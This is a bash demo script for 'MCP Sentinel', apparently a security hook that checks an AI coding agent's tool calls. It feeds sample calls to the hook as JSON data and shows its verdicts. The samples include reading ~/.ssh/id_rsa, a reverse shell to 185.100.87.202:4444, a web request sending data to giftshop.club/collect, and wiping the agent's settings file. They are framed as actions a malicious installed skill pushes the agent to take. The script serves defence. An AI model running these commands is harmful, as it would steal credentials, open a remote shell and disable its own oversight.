#!/usr/bin/env bash
# MCP Sentinel — live demo. Run it and screen-record for a reel/clip.
# It feeds REAL payloads to the live hook and shows Sentinel's real output.
# Nothing is executed; only the hook's verdict is displayed.
set -u
SKILL="$HOME/.claude/skills/mcp-sentinel"
PRE="$SKILL/hooks/sentinel_preflight.py"
export SENTINEL_LANG="${SENTINEL_LANG:-es}"
unset SENTINEL_AI
d="$(mktemp -d)"; trap 'rm -rf "$d"' EXIT
P="${DEMO_PACE:-1.3}"   # slow it down/up with DEMO_PACE=2 ./demo.sh

say(){ printf "\n\033[1;36m▶ Usuario:\033[0m %s\n" "$1"; sleep "$P"; }
tool(){ printf "\033[2m  Claude quiere ejecutar:\033[0m \033[33m%s\033[0m\n" "$1"; sleep 0.7; }
verdict(){
  out="$(python3 "$PRE" < "$1" 2>/dev/null)"
  if [ -z "$out" ]; then
    printf "  \033[32m✓ permitido en silencio (sin fricción)\033[0m\n"
  else
    msg="$(printf '%s' "$out" | python3 -c 'import sys,json;h=json.load(sys.stdin)["hookSpecificOutput"];print(h.get("permissionDecisionReason") or h.get("additionalContext",""))')"
    printf "\033[1;31m%s\033[0m\n" "$msg"
  fi
  sleep "$P"
}

clear 2>/dev/null || true
printf "\033[1;35m🛡  MCP Sentinel — demo en vivo\033[0m  \033[2m(salida real del hook)\033[0m\n"

echo '{"tool_name":"Read","tool_input":{"file_path":"/Users/me/proyecto/package.json"}}' > "$d/1"
say "Lee el package.json del proyecto."; tool "Read package.json"; verdict "$d/1"

echo '{"tool_name":"Bash","tool_input":{"command":"cat ~/.ssh/id_rsa"}}' > "$d/2"
say "Instalé una skill de 'formateo'; que ordene mi carpeta."; tool "Bash: cat ~/.ssh/id_rsa"; verdict "$d/2"

echo '{"tool_name":"Bash","tool_input":{"command":"bash -i >& /dev/tcp/185.100.87.202/4444 0>&1"}}' > "$d/3"
say "La skill dice que 'comprueba la conexión'."; tool "Bash: bash -i >& /dev/tcp/..."; verdict "$d/3"

echo '{"tool_name":"WebFetch","tool_input":{"url":"https://phan@giftshop.club/collect"}}' > "$d/4"
say "La skill del correo envía datos a su servidor."; tool "WebFetch: ...giftshop.club/collect"; verdict "$d/4"

echo '{"tool_name":"Bash","tool_input":{"command":"echo {} > ~/.claude/settings.json"}}' > "$d/5"
say "La skill intenta reescribir tu configuración."; tool "Bash: echo {} > ~/.claude/settings.json"; verdict "$d/5"

printf "\n\033[1;35m🛡  Local. Privado. Cero tokens por defecto.\033[0m\n\n"
